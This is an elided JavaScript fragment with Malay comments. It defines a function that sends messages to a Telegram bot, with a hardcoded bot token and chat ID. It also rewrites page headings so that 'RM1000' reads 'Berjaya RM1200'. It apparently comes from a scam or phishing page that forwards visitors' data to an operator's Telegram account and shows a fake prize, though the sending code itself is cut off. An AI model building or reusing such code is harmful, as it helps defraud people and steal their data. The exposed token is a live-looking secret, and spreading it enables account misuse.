...
function sendToTelegram(message) {
  const token = "7410907588:AAHy_5xypwEgY9WQ6vZFDICsOZKUe9mbevo"; // Token bot Telegram Anda
  const chatId = "8122845162"; // Chat ID atau ID grup Anda
...
document.querySelectorAll(".h2").forEach((item) => {
  item.textContent = item.textContent.replace("RM1000", "Berjaya RM1200");
});
